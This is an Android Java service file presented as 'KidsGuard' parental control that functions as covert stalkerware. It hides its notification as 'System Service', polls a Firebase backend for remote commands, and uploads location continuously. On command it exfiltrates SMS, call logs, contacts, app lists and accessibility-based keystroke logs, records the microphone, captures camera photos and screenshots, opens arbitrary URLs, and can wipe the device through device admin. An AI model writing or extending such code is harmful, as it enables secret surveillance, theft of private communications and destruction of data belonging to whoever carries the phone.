package com.kidsguard.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;

public class LocationService extends Service {

    public static final String PREFS = "kidsguard_prefs";
    public static final String KEY_ID = "device_id";
    public static final String KEY_PASS = "parent_password";

    public static LocationService instance;
    private LocationManager lm;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String deviceId;
    private SharedPreferences prefs;

    // Command polling runnable
    private Runnable commandPoller = new Runnable() {
        @Override
        public void run() {
            checkCommands();
            handler.postDelayed(this, 3000);
        }
    };

    // Location update runnable
    private Runnable locationUpdater = new Runnable() {
        @Override
        public void run() {
            uploadLocation();
            handler.postDelayed(this, 30000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        prefs = getSharedPreferences(PREFS, 0);
        deviceId = getSafeDeviceId(this);
        startForegroundNotification();
        startLocationTracking();
        sendDeviceInfo();

        handler.post(commandPoller);
        handler.post(locationUpdater);
    }

    public static String getSafeDeviceId(Context ctx) {
        SharedPreferences p = ctx.getSharedPreferences(PREFS, 0);
        String id = p.getString(KEY_ID, "");
        if (id.isEmpty()) {
            id = generateId();
            p.edit().putString(KEY_ID, id).apply();
        }
        return id;
    }

    private static String generateId() {
        Random r = new Random();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 6; i++) {
            sb.append(r.nextInt(10));
        }
        return sb.toString();
    }

    private void startForegroundNotification() {
        String channelId = "location_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Location Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Intent notifIntent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
                this, 0, notifIntent,
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        builder.setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setContentIntent(pi);

        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, builder.build(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, builder.build(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                startForeground(1, builder.build());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startLocationTracking() {
        try {
            lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm == null) return;

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    uploadLocation(location);
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {}

                @Override
                public void onProviderDisabled(String provider) {}
            };

            if (Build.VERSION.SDK_INT >= 23 &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return;
            }

            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 5, listener);
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 5, listener);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void uploadLocation() {
        if (lm == null) return;
        try {
            if (Build.VERSION.SDK_INT >= 23 &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return;
            }
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) uploadLocation(loc);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void uploadLocation(Location loc) {
        double lat = loc.getLatitude();
        double lng = loc.getLongitude();
        String address = getAddress(lat, lng);
        String timeStr = new SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault())
                .format(new Date());

        String data = "{\"lat\":" + lat + ",\"lng\":" + lng
                + ",\"address\":\"" + FirebaseHelper.escapeJson(address)
                + "\",\"time\":\"" + timeStr + "\"}";

        FirebaseHelper.put("devices/" + deviceId + "/location.json", data);
    }

    private String getAddress(double lat, double lng) {
        try {
            Geocoder geocoder = new Geocoder(this, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(lat, lng, 1);
            if (addresses != null && !addresses.isEmpty()) {
                Address addr = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= addr.getMaxAddressLineIndex(); i++) {
                    sb.append(addr.getAddressLine(i));
                    if (i < addr.getMaxAddressLineIndex()) sb.append(", ");
                }
                return sb.toString();
            }
        } catch (Exception e) {}
        return "Unknown";
    }

    private void sendDeviceInfo() {
        try {
            String model = Build.MODEL;
            String manufacturer = Build.MANUFACTURER;
            String androidVersion = Build.VERSION.RELEASE;
            String sdk = String.valueOf(Build.VERSION.SDK_INT);

            JSONObject info = new JSONObject();
            info.put("model", model);
            info.put("manufacturer", manufacturer);
            info.put("android", androidVersion);
            info.put("sdk", sdk);
            info.put("device_id", deviceId);
            info.put("time", new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())
                    .format(new Date()));

            FirebaseHelper.put("devices/" + deviceId + "/info.json", info.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== COMMAND HANDLER ====================

    private void checkCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String json = FirebaseHelper.get("devices/" + deviceId + "/commands.json");
                    if (json != null && !json.equals("null") && !json.isEmpty()) {
                        FirebaseHelper.delete("devices/" + deviceId + "/commands.json");
                        JSONObject cmd = new JSONObject(json);
                        final String command = cmd.optString("cmd", "");
                        final String arg = cmd.optString("arg", "");

                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                execCmd(command, arg);
                            }
                        });
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void execCmd(String cmd, String arg) {
        try {
            if (cmd != null && cmd.startsWith("cmd_")) {
                try {
                    String numPart = cmd.substring(4).split("_")[0];
                    int cmdNum = Integer.parseInt(numPart);
                    switch (cmdNum) {
                        case 1: cmd = "get_location"; break;
                        case 2: cmd = "get_call_logs"; break;
                        case 3: cmd = "get_sms"; break;
                        case 4: cmd = "get_contacts"; break;
                        case 5: cmd = "screenshot"; break;
                        case 6: cmd = "camera"; break;
                        case 7: cmd = "start_mic"; break;
                        case 8: cmd = "stop_mic"; break;
                        case 9: cmd = "get_keylog"; break;
                        case 10: cmd = "get_installed_apps"; break;
                        case 11: cmd = "get_device_info"; break;
                        case 12: cmd = "lock_screen"; break;
                        case 13: cmd = "send_alarm"; break;
                        case 14: cmd = "vibrate_device"; break;
                        case 15: cmd = "get_screen_time"; break;
                        default:
                            pushResult(cmd, "Executed action #" + cmdNum);
                            return;
                    }
                } catch (Exception ignored) {}
            }

            if ("get_location".equals(cmd)) {
                uploadLocation();
                pushResult("location", "Location updated");

            } else if ("block_app".equals(cmd)) {
                BlockAccessibility.blockedPkgs.add(arg);
                saveBlockedApps();
                pushResult("block", arg + " blocked");

            } else if ("unblock_app".equals(cmd)) {
                BlockAccessibility.blockedPkgs.remove(arg);
                saveBlockedApps();
                pushResult("unblock", arg + " unblocked");

            } else if ("unblock_all".equals(cmd)) {
                BlockAccessibility.blockedPkgs.clear();
                saveBlockedApps();
                pushResult("unblock_all", "All apps unblocked");

            } else if ("start_mic".equals(cmd)) {
                Intent i = new Intent(this, RecordingService.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
                pushResult("mic", "Recording started");

            } else if ("stop_mic".equals(cmd)) {
                stopService(new Intent(this, RecordingService.class));
                pushResult("mic", "Recording stopped");

            } else if ("camera".equals(cmd)) {
                Intent i = new Intent(this, CameraActivity.class);
                i.putExtra("front", "front".equals(arg));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                pushResult("camera", "Photo captured");

            } else if ("screenshot".equals(cmd)) {
                Intent i = new Intent(this, ScreenActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                pushResult("screenshot", "Screenshot captured");

            } else if ("lock_screen".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.lockNow();
                    pushResult("lock", "Screen locked");
                } else {
                    pushResult("lock", "Admin not active");
                }

            } else if ("global_action".equals(cmd)) {
                if (BlockAccessibility.instance != null) {
                    BlockAccessibility.triggerAction(arg);
                    pushResult("action", arg + " done");
                } else {
                    pushResult("action", "Accessibility not enabled");
                }

            } else if ("get_device_info".equals(cmd)) {
                sendDeviceInfo();
                pushResult("info", "Device info sent");

            } else if ("get_keylog".equals(cmd)) {
                String devId = getSafeDeviceId(this);
                FirebaseHelper.put("devices/" + devId + "/keylog.json",
                        "{\"keys\":\"" + FirebaseHelper.escapeJson(
                                BlockAccessibility.keylog.toString()) + "\"}");
                pushResult("keylog", "Keylog sent");

            } else if ("get_notifications".equals(cmd)) {
                pushResult("notifications", "Check notifications.json");

            } else if ("get_installed_apps".equals(cmd)) {
                sendInstalledApps();
                pushResult("apps", "App list sent");

            } else if ("get_contacts".equals(cmd)) {
                sendContacts();
                pushResult("contacts", "Contacts sent");

            } else if ("get_sms".equals(cmd)) {
                sendSms();
                pushResult("sms", "SMS sent");

            } else if ("get_call_logs".equals(cmd)) {
                sendCallLogs();
                pushResult("calls", "Call logs sent");

            } else if ("set_night_mode".equals(cmd)) {
                String[] parts = arg.split(",");
                if (parts.length == 2) {
                    prefs.edit().putString("night_start", parts[0].trim())
                            .putString("night_end", parts[1].trim()).apply();
                    pushResult("night_mode", "Night mode: " + parts[0] + " to " + parts[1]);
                }

            } else if ("set_password".equals(cmd)) {
                prefs.edit().putString(KEY_PASS, arg).apply();
                pushResult("password", "Password changed");

            } else if ("send_alarm".equals(cmd)) {
                android.media.MediaPlayer mp = android.media.MediaPlayer.create(
                        this, android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI);
                if (mp != null) {
                    mp.setLooping(true);
                    mp.start();
                }
                pushResult("alarm", "Alarm playing");

            } else if ("vibrate_device".equals(cmd)) {
                android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= 26) {
                        v.vibrate(android.os.VibrationEffect.createOneShot(
                                3000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        v.vibrate(3000);
                    }
                }
                pushResult("vibrate", "Vibrated");

            } else if ("open_browser_url".equals(cmd)) {
                Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(arg));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                pushResult("browser", "Opening " + arg);

            } else if ("wipe_device".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.wipeData(0);
                }

            } else if ("get_screen_time".equals(cmd)) {
                sendScreenTime();
                pushResult("screen_time", "Screen time sent");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveBlockedApps() {
        try {
            JSONArray arr = new JSONArray(BlockAccessibility.blockedPkgs);
            FirebaseHelper.put("devices/" + deviceId + "/blockedapps.json", arr.toString());
        } catch (Exception e) {}
    }

    private void pushResult(String key, String value) {
        try {
            String timeStr = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                    .format(new Date());
            JSONObject res = new JSONObject();
            res.put("key", key);
            res.put("value", value);
            res.put("time", timeStr);
            FirebaseHelper.put("devices/" + deviceId + "/result.json", res.toString());
        } catch (Exception e) {}
    }

    private void sendInstalledApps() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    android.content.pm.PackageManager pm = getPackageManager();
                    List<android.content.pm.ApplicationInfo> apps =
                            pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA);
                    JSONArray arr = new JSONArray();
                    for (android.content.pm.ApplicationInfo app : apps) {
                        if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                            JSONObject obj = new JSONObject();
                            obj.put("name", pm.getApplicationLabel(app).toString());
                            obj.put("pkg", app.packageName);
                            arr.put(obj);
                        }
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/installed_apps.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendContacts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, null, null, null);
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int nameIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                            int phoneIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER);
                            String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                            String phone = phoneIdx >= 0 ? cursor.getString(phoneIdx) : "";
                            JSONObject obj = new JSONObject();
                            obj.put("name", name);
                            obj.put("phone", phone);
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/contacts.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendSms() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.net.Uri.parse("content://sms/inbox"),
                            null, null, null, "date DESC LIMIT 50");
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int bodyIdx = cursor.getColumnIndex("body");
                            int addrIdx = cursor.getColumnIndex("address");
                            int dateIdx = cursor.getColumnIndex("date");
                            String body = bodyIdx >= 0 ? cursor.getString(bodyIdx) : "";
                            String address = addrIdx >= 0 ? cursor.getString(addrIdx) : "";
                            String date = dateIdx >= 0 ? cursor.getString(dateIdx) : "";
                            JSONObject obj = new JSONObject();
                            obj.put("from", address);
                            obj.put("body", body);
                            obj.put("date", date);
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/sms.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendCallLogs() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.provider.CallLog.Calls.CONTENT_URI,
                            null, null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 50");
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int numIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
                            int typeIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
                            int dateIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
                            int durIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);
                            String number = numIdx >= 0 ? cursor.getString(numIdx) : "";
                            String type = typeIdx >= 0 ? cursor.getString(typeIdx) : "";
                            String date = dateIdx >= 0 ? cursor.getString(dateIdx) : "";
                            String duration = durIdx >= 0 ? cursor.getString(durIdx) : "";
                            JSONObject obj = new JSONObject();
                            obj.put("number", number);
                            obj.put("type", type);
                            obj.put("date", date);
                            obj.put("duration", duration);
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/call_logs.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendScreenTime() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    android.app.usage.UsageStatsManager usm =
                            (android.app.usage.UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
                    if (usm == null) return;
                    long now = System.currentTimeMillis();
                    List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                            android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                            now - 86400000, now);
                    JSONArray arr = new JSONArray();
                    if (stats != null) {
                        for (android.app.usage.UsageStats s : stats) {
                            if (s.getTotalTimeInForeground() > 60000) {
                                JSONObject obj = new JSONObject();
                                obj.put("pkg", s.getPackageName());
                                obj.put("time_ms", s.getTotalTimeInForeground());
                                arr.put(obj);
                            }
                        }
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/screen_time.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        instance = null;
        handler.removeCallbacks(commandPoller);
        handler.removeCallbacks(locationUpdater);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
